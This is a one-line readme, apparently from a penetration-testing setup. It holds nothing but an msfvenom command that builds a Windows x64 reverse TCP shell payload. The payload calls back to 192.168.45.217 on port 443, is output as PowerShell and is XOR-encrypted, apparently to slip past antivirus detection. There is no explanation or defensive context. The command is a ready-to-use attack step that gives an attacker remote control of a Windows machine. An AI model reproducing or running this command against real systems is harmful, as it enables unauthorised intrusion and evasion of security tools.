# readme

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f ps1 --encrypt xor --encrypt-key z 
```
